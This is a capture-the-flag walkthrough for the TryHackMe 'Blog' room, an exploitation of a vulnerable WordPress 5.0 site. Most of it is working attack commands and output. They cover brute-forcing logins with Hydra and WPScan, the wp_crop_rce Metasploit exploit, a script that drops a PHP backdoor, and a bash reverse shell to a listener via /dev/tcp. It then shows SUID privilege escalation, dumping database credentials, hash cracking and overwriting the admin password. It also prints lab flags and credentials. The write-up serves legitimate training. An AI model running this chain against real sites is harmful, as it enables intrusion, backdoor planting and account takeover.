# THM: Vulnerability in WordPress 5.0  

### Room Overview  
**Room Name:** Blog by Billy Joel  
**Description:** Explore a vulnerable WordPress 5.0 blog and exploit it to gain a foothold, escalate privileges, and obtain flags.  

- [Room Link](https://tryhackme.com/r/room/blog)  
- [Walkthrough Video 1](https://www.youtube.com/watch?v=zmK_hg6hIM0)  
- [Walkthrough Video 2](https://www.youtube.com/watch?v=7xRqCH3Ls34)  
- Additional Write-Ups:  
  - [Medium Post 1](https://medium.com/@jovanski.wisuda/blog-tryhackme-walkthrough-85e323308fc3)  
  - [Medium Post 2](https://whokilleddb.medium.com/tryhackme-blog-9fe23ef0494b)  
  - [GitHub Writeup](https://github.com/dev-angelist/Writeups-and-Walkthroughs/blob/main/thm/blog.md)  
  - [Blog Post by Marco Rei](https://marcorei7.wordpress.com/2020/11/05/086-blog/)  
  - [Hacking Articles](https://www.hackingarticles.in/blog-tryhackme-walkthrough/)  
  - [SysElement Blog](https://blog.syselement.com/home/writeups-and-walkthroughs/tryhackme/practice/medium/blog)  

---

### Step-by-Step Breakdown  

#### 1. **Initial Setup**  
Update the `/etc/hosts` file to resolve the target:  
```bash
echo "10.10.1.68 blog.thm" >> /etc/hosts
```

Prepare directories for the challenge:
```bash
mkdir -p thm/blog.thm/{nmap,content,exploits,scripts}
cd thm/blog.thm
mkdir {nmap,content,exploits,scripts}
cat /etc/hosts
```

Test connectivity:
```bash
ping -c 3 blog.thm
```

### 2. Scanning and Enumeration

2.1. Port Scan

Run a fast Nmap scan to identify open ports:
```bash
nmap --open -p0- -n -Pn -vvv --min-rate 5000 blog.thm -oG nmap/port_scan
```

Results:

Open Ports: 22, 80, 139, 445

Perform detailed scans on the identified ports:
```bash
nmap -p22,80,139,445 -n -Pn -vvv -sCV --min-rate 5000 blog.thm -oN nmap/open_port
```

2.2. Web Enumeration

Discover directories using Gobuster:
```bash
gobuster dir -u blog.thm -w /usr/share/wordlists/dirb/common.txt
```

Scan for WordPress vulnerabilities and users:
```bash
wpscan --url http://blog.thm -e u --api-token <your_token>
```

### 3. Exploitation

3.1. Brute Force Credentials

Use Hydra or WPScan to find valid credentials:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get-form "http://10.10.207.208/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect"
```
or
```bash
wpscan --url http://blog.thm --usernames admin,bjoel,kwheel --passwords /usr/share/wordlists/rockyou.txt
```

Other Method:
```bash
curl http://blog.thm/xmlrpc.php
wpscan --url http://blog.thm --usernames admin,bjoel,kwheel --passwords /usr/share/wordlists/rockyou.txt
```

Credentials Found:

Username: kwheel

Password: cutiepie1


3.2. Remote Code Execution

Search for exploits:
```bash
searchsploit wordpress 5.0
```

Use Metasploit to exploit the vulnerability:
```bash
use exploit/multi/http/wp_crop_rce
set RHOSTS blog.thm
set USERNAME kwheel
set PASSWORD cutiepie1
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

When Getting the metepreter shell:
```bash
meterpreter> getuid
ls
```

Shell
```bash
ls
```

ctrl Z (optional)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Proper shell:
```bash
cat wp-config.php
```

### 4. Post-Exploitation

4.1. Escalating Privileges

Check for SUID binaries:
```bash
find / -perm -u=s -type f 2>/dev/null
```

Analyze and exploit checker:
```bash
export admin="rse"
ltrace /usr/sbin/checker
```

Output:
```bash
getenv("admin")                                                                = nil
puts("Not an Admin"Not an Admin
) 
```

```bash
export admin="rse"

ltrace /usr/sbin/checker

exit

cat /etc/passwd | grep root

id

cat /etc/passwd | grep www-data

/usr/sbin/checker
```

After this we should be Root:
```bash
root@blog:/var/www/wordpress# 

id
```

In case of losing shell:
```bash
passwd root
```

Change password:
```bash
12345678
```

Check login:
```bash
cat /etc/ssh/sshd_config | grep -i permit
```


CTF:
```bash
root@blog:/root# cat root.txt 
9a0b2b618bef9bfa7ac28c1353d9f318

root@blog:/# cd media/
root@blog:/media# ls
usb
root@blog:/media# cd usb/
root@blog:/media/usb# ls
user.txt
root@blog:/media/usb# cat user.txt 
c8421899aae571f7af486492b71a8ab7
```


Other Method:

Bash 1:
```bash
git clone https://github.com/hadrian3689/wordpress_cropimage

cd wordpress_cropimage/

python3 wp_rce.py -h

python3 wp_rce.py -t 'http://blog.thm/' -u kwheel -p cutiepie1 -m twentytwenty
```

Output:
```bash
Dropping Backdoor rse.php
Backdoor URL: http://blog.thm/rse.php

Example Payload: http://blog.thm/rse.php?0=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Bash 2 (Listener):
```bash
rev_shell 10.10.147.84 9001 bash

rev_shell upgrades

nc -lvnp 9001
```

Bash 1:
```bash
curl -s 'http://blog.thm/rse.php?0=id'
```

We should get a reverse shell with this command:
```bash
curl -s 'http://blog.thm/rse.php' --data-urlencode "0=bash -c 'bash -i >& /dev/tcp/10.10.11.36/9001 0>&1'"
```

Output Bash 2:
```bash
www-data@blog:/var/www/wordpress$
```

Bash 2:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

ctrl Z

```bash
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'

stty raw -echo;fg
```

Press enter 2 times

```bash
ls

cat wp-config.php

/** The name of the database for WordPress */
define('DB_NAME', 'blog');

/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'LittleYellowLamp90!@');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```




4.2. Database Extraction

View database credentials in wp-config.php:
```bash
define('DB_USER', 'wordpressuser');
define('DB_PASSWORD', 'LittleYellowLamp90!@');
```

Access the database:
```bash
mysql -u wordpressuser -p
show databases;
use blog;
select * from wp_users;
```

Output:
```bash
1 | bjoel      | $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/ | bjoel         | nconkl1@outlook.com          
user pass: $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/
```

Try to Decode:
```bash
nano hash.txt
```

Paste: 
```bash
$P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/
```
```bash
hashcat hash.txt --identify (phpass)
hashcat hash.txt -m 400 /usr/share/wordlists/rockyou.txt
```
Or
```bash
john --wordlist=/root/Tools/wordlists/rockyou.txt hash.txt
```
Check the cracked password:
```bash
john --show hash.txt
```

Unfortunately, this type of hash is designed to be one-way and cannot be directly decoded back to the original password. The only way to "crack" the hash is by performing a brute force attack or dictionary attack to guess the original password.

Change Admin Pass:
https://codebeautify.org/wordpress-password-hash-generator
add: 12345678
generated: $P$B/cU.bDA/I5Kp70O2cV0EJ/Oc14Qpg.
```bash
mysql> UPDATE wp_users SET user_pass="$P$B/cU.bDA/I5Kp70O2cV0EJ/Oc14Qpg." WHERE user_nicename="bjoel";
```

Admin user:
bjoel

Admin Password:

changed to: 12345678

Login WP as Admin: Successfully





